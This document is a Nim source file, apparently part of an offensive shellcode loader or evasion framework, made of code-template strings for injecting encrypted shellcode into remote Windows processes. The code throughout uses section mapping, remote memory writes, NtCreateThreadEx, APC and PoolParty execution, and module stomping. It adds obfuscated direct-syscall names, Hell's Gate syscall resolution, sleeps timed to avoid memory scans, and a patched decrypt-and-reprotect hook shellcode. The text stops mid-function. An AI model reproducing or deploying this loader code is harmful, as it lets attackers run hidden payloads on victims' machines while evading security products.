let ShellcodeRemoteInjectMapSection * = """

        var pHandle2: HANDLE = -1 # Current Process Handle

        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
            lpMapAddressRemote: PVOID = NULL
            lpMapAddress: PVOID = NULL

        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                var highPrivHandle: HANDLE
                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] DuplicateHandle: "), workedfine
                tProcess = highPrivHandle
                

            when defined(AllocateDripStyle):
                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
                if lpMapAddressRemote == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
                        
                # NtCreateSection Call
                
                var 
                    hMapFile: HANDLE
                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

                status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)

                var
                    vSize: SIZE_T = sc_size
                # NtMapViewOfSection Call local
                status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                when defined(verbose):
                    echo obf("[*] NtMapViewOfSection: "), toHex(status)
                if (lpMapAddress == nil):
                    echo obf("[-] Failed to map view of file")
                    echo GetLastError()
                
                echo obf("[*] Moving shellcode to memory...")
                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))                
                
                # Why did I use NtWrite here instead of local copy.. No one knows.
                # var bytesWritten: SIZE_T
                # NtWriteVirtualMemory Call
                #status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)

                #when defined(verbose):
                #    echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                #    echo obf("    \\-- bytes written: "), bytesWritten
                #    echo obf("")

                
                # NtMapViewOfSection Call remote
                when defined(RX):
                    protectionValue = PAGE_EXECUTE_READ
                
                status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
                
                if (lpMapAddressRemote == nil):
                    echo obf("[-] Failed to map view of file remote")
                    echo toHex(status)
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                ptrEncText = cast[ptr byte](lpMapAddress)
                ptrDecText = cast[ptr byte](lpMapAddress)
                decryptlate()
            
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)

            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)

            when defined(verbose):
                echo success
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
            
            when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                # duplicate handle to PROCESS_ALL_ACCESS
                when defined(Hellsgate):
                    if getSyscall(ntDuplicateTable):
                        syscall = ntDuplicateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
                var highPrivHandle: HANDLE
                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] NtDuplicateObject: "), status
                tProcess = highPrivHandle
        

            when defined(AllocateDripStyle):
                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
                if lpMapAddressRemote == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                when defined(Hellsgate):
                    if getSyscall(ntCreateSectionTable):
                        syscall = ntCreateSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateSection")
                
                # NtCreateSection Call
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
            
                var 
                    hMapFile: HANDLE
                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

                status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)
                
                if (hMapFile == 0):
                    echo obf("[-] Failed to create file mapping")
                    echo GetLastError()
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                
                var
                    vSize: SIZE_T = sc_size

                status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                when defined(verbose):
                    echo obf("[*] NtMapViewOfSection: "), toHex(status)

                if (lpMapAddress == nil):
                    echo obf("[-] Failed to map view of file")
                    echo GetLastError()
            

                echo obf("[*] Moving shellcode to memory...")
                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))  
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                
                when defined(RX):
                    protectionValue = PAGE_EXECUTE_READ
                status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
                
                if (lpMapAddressRemote == nil):
                    echo obf("[-] Failed to map view of file remote")
                    echo toHex(status)
            
            when defined(QueueAPC):
                # first create the sleep Thread before sleeping in between, because that could trigger memory scans
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            
            when defined(AllocateDripStyle):
                lpMapAddress = decryptbuffer
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
            
            when defined(poolparty):
                ExecutePoolparty(tProcess, lpMapAddressRemote)
                return

            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](lpMapAddressRemote)
                #var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
                decryptlate()
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, lpMapAddressRemote, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
                #when defined(sleepinbetween):
                #    HowMuchTimeWouldYouLikeToSleep(5)
                #Sleep(10)
                #decryptlate()
            else:
                decryptlate()
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    lpMapAddressRemote, 
                    NULL, FALSE, 0, 0, 0, NULL)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(lpMapAddressRemote)

    injectCreateRemoteThread(enctext) 

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""


let ShellcoderemoteinjectStub * = """
    
        var pHandle2: HANDLE = -1 # Current Process Handle
        
        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
                
                # duplicate handle to PROCESS_ALL_ACCESS
                var highPrivHandle: HANDLE
                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] DuplicateHandle: "), workedfine
                tProcess = highPrivHandle
            

            when defined(AllocateDripStyle):
                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
                if ds == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE        
                when defined(RX):
                    protectionValue = PAGE_READWRITE
                when defined(RWX):
                    protectionValue = PAGE_EXECUTE_READWRITE
                status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                when defined(verbose):
                    echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
                var bytesWritten: SIZE_T
                
                ptrEncText = cast[ptr byte](addr encText[0])
                ptrDecText = cast[ptr byte](addr decText[0])
                decryptlate()

                status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

                when defined(verbose):
                    echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo obf("")
            
            when defined(JmpEntry):
                var newEntry: LPVOID
                newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
                when defined(verbose):
                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"
            
            when defined(JmpEntry):
                    ds = newEntry
            
            when defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                status = uashdiasdj(tProcess,&ds,&sc_size,PAGE_EXECUTE_READ,addr oldProtection)
                when defined(verbose):
                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                    if (status == 0):
                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ"), repr(ds)
                if(status != 0):
                    quit(1)

            when not defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            

            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(ds)
            
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(tProcess, ds)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            
            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)
 
        else:

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
        
            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), status
                
                # duplicate handle to PROCESS_ALL_ACCESS
                when defined(Hellsgate):
                    if getSyscall(ntDuplicateTable):
                        syscall = ntDuplicateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
                var highPrivHandle: HANDLE
                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
                when defined(verbose):
                    echo obf("[*] NtDuplicateObject: "), toHex(status)
                tProcess = highPrivHandle
        
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
            when defined(RX):
                protectionValue = PAGE_READWRITE
            when defined(RWX):
                protectionValue = PAGE_EXECUTE_READWRITE
            
            when defined(AllocateDripStyle):
                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
                if ds == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:

                when defined(stomb):
                    when defined(verbose):
                        echo obf("\r\n[*] Injecting DLL: "), stombDll, " into the remote process"
                    
                    when defined(logFile):
                        logVerbose(obf("[*] Injecting DLL \r\n"))

                    if(remoteLoadDll(DLLPATH, tProcess)):
                        when defined(verbose):
                            echo obf("[+] DLL injected successfully")
                        when defined(logFile):
                            logVerbose(obf("[+] DLL injected successfully\r\n"))
                    else:
                        when defined(verbose):
                            echo obf("[-] DLL injection failed")
                        when defined(logFile):
                            logVerbose(obf("[-] DLL injection failed\r\n"))
                        quit(1)
                    
                    var module = GetRemoteModuleHandle(tProcess, stombDll)
                    when defined(verbose):
                        echo obf("[*] Using "), stombDll, obf(" .text section as shellcode buffer")
                        echo obf("[*] Found baseAddress at: "), repr(module)
                    
                    when defined(logFile):
                        logVerbose(obf("[*] Found baseAddress at: ") & cast[string](repr(module)) & "\r\n")

                    ds = GetRemoteProcAddress(tProcess, module, stombFunc)
                    rPtr2 = ds
                    when defined(verbose):
                        echo obf("[*] Found "), stombFunc, obf(" address at: "), repr(ds)


                    var allocationSize: SIZE_T = cast[SIZE_T](sc_size) + 0x1000
                        
                    when defined(restore):
                        var textStart: LPVOID = cast[LPVOID](module) + 0x1000 # .text section always starts at this offset to the base address
                        var mbi: MEMORY_BASIC_INFORMATION
                        var sectionSize: SIZE_T = VirtualQueryEx(tProcess, textStart, addr mbi, sizeof(mbi))
                        when defined(verbose):
                            echo obf("[*] VirtualQueryEx result: "), sectionSize
                            echo obf("[*] Section size: "), mbi.RegionSize
                        
                        var originalRXSection: seq[byte] = newSeq[byte](mbi.RegionSize)
                        var numberOfBytesRead: SIZE_T
                        
                        when defined(Hellsgate):
                            if getSyscall(ntReadTable):
                                syscall = ntReadTable.wSysCall
                            else:
                                when defined(verbose):
                                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")

                        status = NtReadVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
                        when defined(verbose):
                            if (status == 0):
                                echo obf("[+] ReadProcessMemory success!")
                            else:
                                echo obf("[-] Failed to read the original RX section")
                                quit(1)

                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                    var protAddress: LPVOID = ds
                    var oProtect: DWORD
                    status = NtProtectVirtualMemory(tProcess, addr protAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
                    when defined(logFile):
                        logVerbose(obf("[*] Buffer address: ") & cast[string](repr(ds)) & "\r\n")
                        logVerbose(obf("[*] NtProtectVirtualMemory RW for address: ") & cast[string](repr(protAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protAddress)
                            quit(1)
                        echo "[*] Buffer address: ", repr(ds)
                    

                else:
                    status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                    when defined(verbose):
                        echo obf("[*] NtAllocateVirtualMemory: "), status
                    when defined(logFile):
                        logVerbose(obf("[*] NtAllocateVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
            
            var bytesWritten: SIZE_T
            
            when defined(JmpEntry):
                var newEntry: LPVOID
                newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
                when defined(verbose):
                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
            when defined(QueueAPC):
                # Do the Sleep Thread creation before decrypting, as that could lead to memory scans.
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            
            when not defined(AllocateDripStyle):
                ptrEncText = cast[ptr byte](addr encText[0])
                ptrDecText = cast[ptr byte](addr decText[0])
                decryptlate()

                status = NtWriteVirtualMemory(
                    tProcess, 
                    ds, 
                    unsafeAddr friendlycode, 
                    sc_size-1, 
                    addr bytesWritten)

                when defined(verbose):
                    echo obf("[*] NtWriteVirtualMemory: "), status
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo obf("")
                
                when defined(logFile):
                    logVerbose(obf("[*] NtWriteVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
                    logVerbose(obf("    \\-- bytes written: ") & cast[string](bytesWritten) & "\r\n")
                    logVerbose("\r\n")
                
                when not defined(carokann):
                    when defined(RX):
                        when defined(Hellsgate):
                            if getSyscall(ntProtectTable):
                                syscall = ntProtectTable.wSysCall
                            else:
                                when defined(verbose):
                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                        when defined(sleepinbetween):
                            when defined(verbose):
                                echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                        
                        status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                        when defined(verbose):
                            echo obf("[*] NtProtectVirtualMemory: "), status
                            if (status == 0):
                                echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                        if(status != 0):
                            quit(1)
                
                when not defined(RX):
                    when defined(sleepinbetween):
                        when defined(verbose):
                            echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)

            when defined(carokann):
                when not defined(stomb):
                    var rPtr2: LPVOID
                var protectAddress: LPVOID = ds
                var oldProtect: DWORD
                when defined(JmpEntry):
                    var tempdsAddress = ds
                    ds = newEntry

                const hookShellcode = slurp"decryptprotect.bin.tmp"

                var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

                var hook_sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)

                #var rPtr2: LPVOID

                when defined(verbose):
                    echo  obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect")
                
                when defined(logFile):
                    logVerbose(obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect\r\n"))

                when defined(stomb):
                    when defined(verbose):
                        echo obf("[*] Using "), stombDll, obf(" .text section as shellcode buffer")
                        echo obf("[*] Found baseAddress at: "), repr(rPtr2)
                    #rPtr2 = getTextSectionStart(rPtr2)
                    rPtr2 = GetRemoteProcAddress(tProcess, module, stombFunc2)
                    #rPtr2 = rPtr2
                    when defined(verbose):
                        echo obf("[*] Found "), stombFunc2, obf(" address at: "), repr(rPtr2)
                    when defined(logFile):
                        logVerbose(obf("[*] Found baseAddress at: ") & cast[string](repr(rPtr2)) & "\r\n")
                        logVerbose(obf("[*] Found ") & cast[string](stombFunc2) & obf(" address at: ") & cast[string](repr(rPtr2)) & "\r\n")
                    protectAddress = rPtr2
                    # as the function won't start at the section start, the protectAddress will have an
                    # offset to the address where we write the shellcode later on. This could lead to a problem,
                    # if the shellcode is too big and the function is not at the end of the section. 
                    # So we need to calculate the difference between the section start and the function start and may need to protect one more section
                    # Or we just allocate one more 4kB page so make sure the offset is no problem
                    var allocateSize: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len) + 0x1000
                    
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                    
                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
                    when defined(logFile):
                        logVerbose(obf("[*] NtProtectVirtualMemory RW for address: ") & cast[string](repr(protectAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
                    
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                            quit(1)

                else:
                    when defined(Hellsgate):
                        if getSyscall(ntAllocTable):
                            syscall = ntAllocTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

                    status = NtAllocateVirtualMemory(
                        tProcess,
                        addr rPtr2,
                        0,
                        addr hook_sc_size,
                        MEM_COMMIT or MEM_RESERVE,
                        PAGE_READWRITE)
                    when defined(logFile):
                        logVerbose(obf("[*] NtAllocateVirtualMemory for Caro-Kann shellcode: ") & cast[string](toHex(status)) & "\r\n")
                        
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtAllocateVirtualMemory for Caro-Kann shellcode success "), repr(rPtr2)
                        else:
                            echo obf("[-] NtAllocateVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2)
                            quit(1)
                    

                # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
                # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address

                var eggIndex = 0

                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address"), repr(ds)

                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        eggIndex = i
                        break

                when defined(verbose):
                    echo obf("[*] Writing allocated memory address into egg")

                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)

                when defined(verbose):
                    echo obf("[*] Done.")

                # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address


                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the second egg, which will be filled the same address but to jump there at the end")

                eggIndex = 0

                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        # our 0x00 bytes start at position three, so we need to add three to the index
                        eggIndex = i + 2
                        break

                when defined(verbose):
                    echo obf("[*] Writing memory address into the jump at the end")

                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)

                # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)

                
                when defined(stomb):
                    # We need to find and overwrite the egg 0x9999999999999999 with the address of the protectAddress, so that our shellcode knows where to re-protect
                    eggIndex = 0
                    when defined(verbose):
                        echo obf("-------------------------------------------------------------")
                        echo obf("[*] Looking for the fifth egg, which will be filled with the address of the memory address to re-protect")
                    
                    for i in 0 ..< hookShellcodeBytes.len:
                        if (hookShellcodeBytes[i] == 0x99) and (hookShellcodeBytes[i+1] == 0x99) and (hookShellcodeBytes[i+2] == 0x99) and (hookShellcodeBytes[i+3] == 0x99) and (hookShellcodeBytes[i+4] == 0x99) and (hookShellcodeBytes[i+5] == 0x99) and (hookShellcodeBytes[i+6] == 0x99) and (hookShellcodeBytes[i+7] == 0x99):
                            when defined(verbose):
                                echo obf("[*] Found egg at index: "), i
                            eggIndex = i
                            break

                    when defined(verbose):
                        echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)



                # Finally write the decryptprotect.bin shellcode into the remote process
                
                when defined(Hellsgate):
                    if getSyscall(ntWriteTable):
                        syscall = ntWriteTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                
                when defined(logFile):
                    logVerbose(obf("[*] Writing Caro-Kann shellcode into remote process rPtr2 address: ") & cast[string](repr(rPtr2)) & "\r\n")

                status = NtWriteVirtualMemory(tProcess, rPtr2, unsafeAddr hookShellcodeBytes[0], hook_sc_size, addr bytesWritten)
                
                when defined(logFile):
                    logVerbose(obf("[*] NtWriteVirtualMemory for Caro-Kann shellcode success! ") & cast[string](repr(rPtr2)) & "\r\n")
                   
                if (status == 0):
                    when defined(verbose):
                        echo obf("[+] NtWriteVirtualMemory for Caro-Kann shellcode success! "), repr(rPtr2)
                        echo obf("    \\-- bytes written: "), bytesWritten
                        echo obf("")
                else:
                    when defined(verbose):
                        echo obf("[-] NtWriteVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2) ," ",  toHex(status)
                    quit(1)
                
                
                # Setting permissions to RX via VirtualProtectEx

                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                #var oldProtect: DWORD
                protectAddress = rPtr2
                status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
                
                when defined(logFile):
                    logVerbose(obf("[*] NtProtectVirtualMemory RX for address: ") & cast[string](repr(protectAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
                    
                if (status == 0):
                    when defined(verbose):
                        echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectAddress)
                        echo obf("    \\-- old protection: "), oldProtect
                        echo obf("")
                else:
                    when defined(verbose):
                        echo obf("[-] NtProtectVirtualMemory for Caro-Kann shellcode failed!")
                    quit(1)
                

                ds = rPtr2
            
            when defined(stomb):
                # as the execute primitive should now execute our custom shellcode, we need to set ds to the address of the shellcode. 
                # It will automatically jump to the regular shellcode after sleep, decryption and re-protect.
                ds = rPtr2
            
            when defined(logFile):
                logVerbose(obf("[*] Address for rPtr2 is: ") & cast[string](repr(rPtr2)) & "\r\n")


            when defined(restore): # void function
                proc restoreText(): void =
                    
                    when defined(carokann):
                        Sleep(12000)
                    else:
                        Sleep(200)
                    
                    when defined(verbose):
                        echo obf("[*] Restoring original .text section")
                    protectAddress = textStart
                    allocateSize = mbi.RegionSize
                    
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, oldProtect, addr oldProtect)
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                            quit(1)
                    
                    when defined(Hellsgate):
                        if getSyscall(ntWriteTable):
                            syscall = ntWriteTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                    status = NtWriteVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], (mbi.RegionSize), addr bytesWritten)

                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtWriteVirtualMemory success"), repr(textStart) 
                        else:
                            echo obf("[-] Failed to write the original RX section"), repr(textStart), toHex(status)
                            quit(1)
                    
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
